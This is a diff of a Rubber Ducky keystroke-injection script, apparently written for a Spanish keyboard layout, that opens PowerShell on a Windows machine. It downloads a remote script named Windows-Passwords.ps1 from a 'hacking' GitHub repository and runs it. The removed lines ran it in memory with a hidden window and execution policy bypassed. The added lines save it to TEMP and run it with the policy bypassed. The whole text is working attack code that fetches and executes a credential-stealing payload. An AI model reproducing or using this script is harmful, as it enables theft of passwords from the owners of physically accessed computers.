@@ -14,9 +14,13 @@ Ducky_lang ES
 DELAY 2000
 GUI r
 DELAY 250
-STRING powershell -w h -ep bypass 
+STRING powershell 
+ENTER 
+DELAY 1000
 REM Provide payload
 DEFINE PAYLOAD https://raw.githubusercontent.com/javirufo-ies/hacking/main/Windows-Passwords.ps1
-STRINGLN $code = irm PAYLOAD -UseBasicParsing
-STRINGLN [ScriptBlock]::Create($code).Invoke()
-REM STRINGLN 'irm PAYLOAD | iex'
+STRINGLN $path = "$env:TEMP\script.ps1"
+STRINGLN irm PAYLOAD -OutFile $path
+STRINGLN powershell -ExecutionPolicy Bypass -File $path
+DELAY 2000
+STRINGLN exit
